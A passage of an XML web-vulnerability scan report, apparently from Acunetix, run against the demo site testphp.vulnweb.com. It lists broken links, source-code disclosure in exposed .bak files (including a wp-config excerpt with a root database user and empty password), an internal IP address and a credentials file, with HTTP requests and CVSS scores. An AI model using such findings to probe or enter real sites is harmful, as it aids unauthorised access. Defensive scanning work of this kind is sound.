       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Problems navigating the site.]]></Impact>
       <Description><![CDATA[A broken link refers to any link that should take you to a document, image or webpage, that actually results in an error. This page was linked from the website but it is inaccessible.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove the links to this file or make it accessible.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /medias/css/main.css HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/pictures/path-disclosure-unix.html
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 404 Not Found
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:25:12 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 570
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="102" color="green">
       <Name><![CDATA[Broken links]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[For a complete list of URLs linking to this file, go to Site Structure &gt; Locate and select the file (marked as &quot;Not Found&quot;) &gt; select Referrers Tab from the bottom of the Information pane.]]></Details>
       <Affects><![CDATA[/medias/js/common_functions.js]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Problems navigating the site.]]></Impact>
       <Description><![CDATA[A broken link refers to any link that should take you to a document, image or webpage, that actually results in an error. This page was linked from the website but it is inaccessible.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove the links to this file or make it accessible.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /medias/js/common_functions.js HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/pictures/path-disclosure-unix.html
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 404 Not Found
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:25:12 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 570
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="103" color="orange">
       <Name><![CDATA[Source code disclosure]]></Name>
       <ModuleName><![CDATA[Scripting (Text_Search_File.script)]]></ModuleName>
       <Details><![CDATA[<br/>Pattern found: <pre wrap="virtual"><font color="blue">&lt;?PHP require_once(&quot;database_connect.php&quot;); ?&gt;
&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;
&quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;
&lt;html&gt;&lt;!-- InstanceBegin template=&quot;/Templates/main_dynamic_template.dwt.php&quot; codeOutsideHTMLIsLocked=&quot;false&quot; --&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-2&quot;&gt;

&lt;!-- InstanceBeginEditable name=&quot;document_title_rgn&quot; --&gt;
&lt;title&gt;Home of WASP Art&lt;/title&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; type=&quot;text/css&quot;&gt;
&lt;!-- InstanceBeginEditable name=&quot;headers_rgn&quot; --&gt;
&lt;!-- here goes headers headers --&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;
&lt;!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName==&quot;Netscape&quot;)&amp;&amp;(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.re ...</font></pre>]]></Details>
       <Affects><![CDATA[/index.bak]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker can gather sensitive information (database connection strings, application logic) by analyzing the source code. This information can be used to conduct further attacks.]]></Impact>
       <Description><![CDATA[Looks like the source code for this script is available. This check is using pattern matching to determine if server side tags are found in the file. In some cases this alert may generate false positives.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove this file from your website or change its permissions to remove access.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /index.bak HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/index.php
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*
]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:25:10 GMT
Content-Type: text/plain
Content-Length: 3265
Last-Modified: Wed, 11 May 2011 10:27:48 GMT
Connection: keep-alive
ETag: &quot;4dca64a4-cc1&quot;
Accept-Ranges: bytes
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Source Code Disclosure]]></Database>
          <URL><![CDATA[http://www.imperva.com/resources/glossary?term=source_code_disclosure]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="104" color="orange">
       <Name><![CDATA[Source code disclosure]]></Name>
       <ModuleName><![CDATA[Scripting (Text_Search_File.script)]]></ModuleName>
       <Details><![CDATA[<br/>Pattern found: <pre wrap="virtual"><font color="blue">&lt;?php
// ** MySQL settings ** //
define('DB_NAME', 'wp265as');    // The name of the database
define('DB_USER', 'root');     // Your MySQL username
define('DB_PASSWORD', ''); // ...and password
define('DB_HOST', 'localhost');    // 99% chance you won't need to change this value
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');

// Change each KEY to a different unique phrase.  You won't have to remember the phrases later,
// so make them long and complicated.  You can visit http://api.wordpress.org/secret-key/1.1/
// to get keys generated for you, or just make something up.  Each key should have a different phrase.
define('AUTH_KEY', 'put your unique phrase here'); // Change this to a unique phrase.
define('SECURE_AUTH_KEY', 'put your unique phrase here'); // Change this to a unique phrase.
define('LOGGED_IN_KEY', 'put your unique phrase here'); // Change this to a unique phrase.

// You can have multiple installations in one database if you give each a unique prefix
$table_prefix  = 'w ...</font></pre>]]></Details>
       <Affects><![CDATA[/pictures/wp-config.bak]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker can gather sensitive information (database connection strings, application logic) by analyzing the source code. This information can be used to conduct further attacks.]]></Impact>
       <Description><![CDATA[Looks like the source code for this script is available. This check is using pattern matching to determine if server side tags are found in the file. In some cases this alert may generate false positives.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove this file from your website or change its permissions to remove access.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /pictures/wp-config.bak HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/pictures/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*
]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:25:11 GMT
Content-Type: text/plain
Content-Length: 1535
Last-Modified: Wed, 03 Dec 2008 14:37:43 GMT
Connection: keep-alive
ETag: &quot;493699b7-5ff&quot;
Accept-Ranges: bytes
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Source Code Disclosure]]></Database>
          <URL><![CDATA[http://www.imperva.com/resources/glossary?term=source_code_disclosure]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="105" color="green">
       <Name><![CDATA[Possible internal IP address disclosure]]></Name>
       <ModuleName><![CDATA[Scripting (Text_Search_File.script)]]></ModuleName>
       <Details><![CDATA[<br/>Pattern found: <pre wrap="virtual"><font color="blue">192.168.0.26</font></pre>]]></Details>
       <Affects><![CDATA[/pictures/ipaddresses.txt]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Possible sensitive information disclosure.]]></Impact>
       <Description><![CDATA[A string matching an internal IPv4 address was found on this page. This may disclose information about the IP addressing scheme of the internal network. This information can be used to conduct further attacks.<br/><br/> <div class="coolbox"><font color="dark">This alert may be a false positive, manual confirmation is required.</font></div>]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Prevent this information from being displayed to the user.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /pictures/ipaddresses.txt HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/pictures/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*
]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:25:11 GMT
Content-Type: text/plain
Content-Length: 52
Last-Modified: Fri, 23 Jan 2009 12:59:43 GMT
Connection: keep-alive
ETag: &quot;4979bf3f-34&quot;
Accept-Ranges: bytes
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="106" color="green">
       <Name><![CDATA[Possible username or password disclosure]]></Name>
       <ModuleName><![CDATA[Scripting (Text_Search_File.script)]]></ModuleName>
       <Details><![CDATA[<br/>Pattern found: <pre wrap="virtual"><font color="blue">password=something</font></pre>]]></Details>
       <Affects><![CDATA[/pictures/credentials.txt]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Possible sensitive information disclosure.]]></Impact>
       <Description><![CDATA[A username and/or password was found in this file. This information could be sensitive.<br/><br/> <div class="coolbox"><font color="dark">This alert may be a false positive, manual confirmation is required.</font></div>]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove this file from your website or change its permissions to remove access.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /pictures/credentials.txt HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/pictures/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*
]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:25:11 GMT
Content-Type: text/plain
Content-Length: 33
Last-Modified: Fri, 23 Jan 2009 10:47:58 GMT
Connection: keep-alive
ETag: &quot;4979a05e-21&quot;
Accept-Ranges: bytes
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
